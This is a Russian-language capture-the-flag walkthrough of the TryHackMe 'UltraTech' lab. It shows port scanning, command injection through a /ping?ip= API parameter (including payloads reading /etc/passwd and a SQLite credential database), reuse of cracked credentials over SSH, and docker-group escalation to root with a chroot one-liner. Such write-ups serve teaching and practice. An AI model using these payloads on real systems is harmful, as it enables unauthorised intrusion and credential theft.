# ultratech1

- https://tryhackme.com/room/ultratech1
- RCE
- Docker to root
## Разведка

Для начала просканируем все порты, в задании сказано, что они могут быть нестандартные.

```
nmap -p- -v 10.64.155.189
Discovered open port 21/tcp on 10.64.155.189
Discovered open port 22/tcp on 10.64.155.189
Discovered open port 31331/tcp on 10.64.155.189
```

При таком сканирования nmap обнаружил только порт 31331, про 8081 ничего нет, хотя он фигурирует в задании. Запустим точечное сканирование с версиями на каждый порт и со скриптами.
```
└─$ nmap -sC -sV -p 21,22,31331,8081 10.67.162.31
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 17:10 +0300
Nmap scan report for 10.67.162.31
Host is up (0.20s latency).

PORT      STATE  SERVICE         VERSION
21/tcp    open   ftp             vsftpd 3.0.5
22/tcp    open   ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 73:a5:f7:8d:16:72:c7:48:4b:1b:38:9a:3a:f7:a6:30 (RSA)
|   256 b4:14:0b:ac:4c:96:fd:af:d3:e9:e2:0d:05:b3:b7:8a (ECDSA)
|_  256 0b:ce:26:04:e6:07:6c:b3:1c:9c:16:f8:65:39:a2:63 (ED25519)
8081/tcp  closed blackice-icecap
31331/tcp open   http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.75 seconds
```
Порт 8081 найден, но что там стоит не понять, blackice-icecap это фаерволл. Его можно попробовать обойти по разному, разделением пакетов например. Но для начала попробуем просто убрать ICMP сканирвоание командой -Pn

```
└─$ nmap -sC -sV -Pn -p 8081 10.67.162.31
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 17:12 +0300
Nmap scan report for 10.67.162.31
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.15 seconds
```
Отлично!
Будем идти по порядку по каждому порту чтобы ничего не пропустить.

Пробуем зайти на FTP:
```
└─$ ftp 10.67.147.76                    
Connected to 10.67.147.76.
220 (vsFTPd 3.0.5)
Name (10.67.147.76:obsca): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
Anonymous не работает

На 31331 порту нас встречает сайт. Полей для ввода нет и ничего такого. 
<img width="1470" height="777" alt="Pasted image 20260110141025" src="https://github.com/user-attachments/assets/884f86df-2f0e-4914-8712-9c49da214f4e" />

/robots.txt
<img width="704" height="168" alt="Pasted image 20260110140855" src="https://github.com/user-attachments/assets/ea57cf74-1e01-4616-b312-c82b305720d6" />

На /utech_sitemap.txt
```
/
/index.html
/what.html
/partners.html
```

На /partners.html находим поле авторизации.
<img width="1470" height="775" alt="Pasted image 20260110141545" src="https://github.com/user-attachments/assets/c203920b-47eb-4d9c-a9d2-476732e9adaa" />

Перебираем директории. Тут я много уже облазил сайт и решил перебрать все
```
└─$ feroxbuster -u http://10.67.147.76:31331 --dont-extract-links

...

403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      322c http://10.67.147.76:31331/images => http://10.67.147.76:31331/images/
301      GET        9l       28w      318c http://10.67.147.76:31331/js => http://10.67.147.76:31331/js/
200      GET      139l      531w     6092c http://10.67.147.76:31331/
301      GET        9l       28w      319c http://10.67.147.76:31331/css => http://10.67.147.76:31331/css/
301      GET        9l       28w      326c http://10.67.147.76:31331/javascript => http://10.67.147.76:31331/javascript/
301      GET        9l       28w      333c http://10.67.147.76:31331/javascript/jquery => http://10.67.147.76:31331/javascript/jquery/
200      GET    10363l    41520w   271756c http://10.67.147.76:31331/javascript/jquery/jquery
301      GET        9l       28w      332c http://10.67.147.76:31331/javascript/async => http://10.67.147.76:31331/javascript/async/
200      GET     1058l     3007w    32659c http://10.67.147.76:31331/javascript/async/async
[####################] - 5m    210000/210000  0s      found:9       errors:1000   
[####################] - 4m     30000/30000   111/s   http://10.67.147.76:31331/ 
[####################] - 6s     30000/30000   5059/s  http://10.67.147.76:31331/js/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 6s     30000/30000   5051/s  http://10.67.147.76:31331/images/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   93458/s http://10.67.147.76:31331/css/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 4m     30000/30000   112/s   http://10.67.147.76:31331/javascript/ 
[####################] - 4m     30000/30000   113/s   http://10.67.147.76:31331/javascript/jquery/ 
[####################] - 4m     30000/30000   119/s   http://10.67.147.76:31331/javascript/async/ 
```
У нас есть много директорий с js кодом. Утечка через JavaScript

Тут я еще много поизучал файл но в конечном итоге на директории /js/app.js находим такой файл
```
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```
В нем есть очень интересная строчка для нас. 

```
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```
Мы видим некий запрос /ping?ip= Это эндпоинт API Node.js. Разрабами как я понимаю предполагался ping машины. и если пользовательский ввод отправляется просто в терминал без экранирования и каких либо проверок, то для нас это хорошо.
Если эндпоинт делает:
```
ping -c 1 <user_input>
```
То можно выполнить:
```
10.0.0.1; id
```
Или 
```
127.0.0.1 && cat /etc/passwd
```
Проверим это.

## Эксплуатация
```
└─$ curl "http://10.67.147.76:8081/ping?ip=10.67.147.76"   
PING 10.67.147.76 (10.67.147.76) 56(84) bytes of data.
64 bytes from 10.67.147.76: icmp_seq=1 ttl=64 time=0.045 ms

--- 10.67.147.76 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
```
Пинг работает, пробуем выполнить в браузере с id.

<img width="779" height="143" alt="Pasted image 20260110142358" src="https://github.com/user-attachments/assets/43a1c044-b192-4a0a-9c57-1d6a468b1c6f" />

Отлично! это Command injection. 
Тут можно попробовать прокинуть реверс шелл, но для начала посмотрим какие есть файлы
Командой ls находим файл utech.db.sqlite и читаем его.

```
http://10.67.147.76:8081/ping?ip=10.67.147.76%20'cat%20utech.db.sqlite'
```

Получаем такой ответ
```
ping: ) ���(Mr00tf************32)Madmin0******************84: Name or service not known
```

https://emn178.github.io/online-tools/ дешифруем тут.

При входе в оба аккаунта на /partners.html получаем один и тот-же ответ. 
```
# Restricted area

Hey r00t, can you please have a look at the server's configuration?  
The intern did it and I don't really trust him.  
Thanks!  
```

Пробуем подключится по ssh с теми же кредами.
```
ssh r00t@10.67.147.76
```
И мы внутри.
## Root
```
r00t@ip-10-67-147-76:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Мы внутри контейнера, пробуем повысить привилегий через GTFOBins.
- https://gtfobins.github.io/gtfobins/docker/

```
r00t@ip-10-67-147-76:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
See 'docker run --help'.
```
Не выходит, тк контейнера alpine у нас нет. 
Смотрим какие уже есть запущенные контейнеры:
```
r00t@ip-10-67-147-76:~$ docker ps -a
CONTAINER ID   IMAGE     COMMAND                  CREATED       STATUS                     PORTS     NAMES
7beaaeecd784   bash      "docker-entrypoint.s…"   6 years ago   Exited (130) 6 years ago             unruffled_shockley
696fb9b45ae5   bash      "docker-entrypoint.s…"   6 years ago   Exited (127) 6 years ago             boring_varahamihira
9811859c4c5c   bash      "docker-entrypoint.s…"   6 years ago   Exited (127) 6 years ago             boring_volhard
```

И выполняем команду через существующий файл.
```
r00t@ip-10-67-147-76:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```
## Как работает повышение привилегий?

Эта техника срабатывает, если мы имеем доступ к сокету докер демона. Мы принадлежим к группе пользователей, которые внутри докера могут выполнять команды как root.

Запускаем контейнер.
```
docker run
```

Мы монтируем корень хостовой файловой системы внутрь контейнера, и теперь по сути файловая система будет внутри нашего Docker-контейнера.
```
-v /:/mnt
```

Запускаем интерактивный контейнер  -it интерактивный терминал bash - шелл удаление после выполнения. 
```
--rm -it bash
```

И тут вообще brainfuck. Как я понял, chroot меняет корневую директорию процесса, и типо шелл думает, что он работает в /mnt как в /, а типо /mnt — это корень хоста.
```
chroot /mnt sh
```

Читаем id_rsa как сказано в задании, это и есть флаг.
```
# cd /root
# cd .ssh
# ls
authorized_keys  id_rsa  id_rsa.pub
# cat id_rsa
```

## Итог: почему удалось взломать?
- Плохая настройка firewall при включении -Pn фаерволл пропускает
- Информационная утечка через JavaScript
- Command Injection (RCE) в /ping?ip=
- Хранение паролей в базе без соли
- Один и тот же пароль использовался:
	- для входа на сайт /partners.html
	- для SSH
- Пользователь в группе docker → Privilege Escalation до root
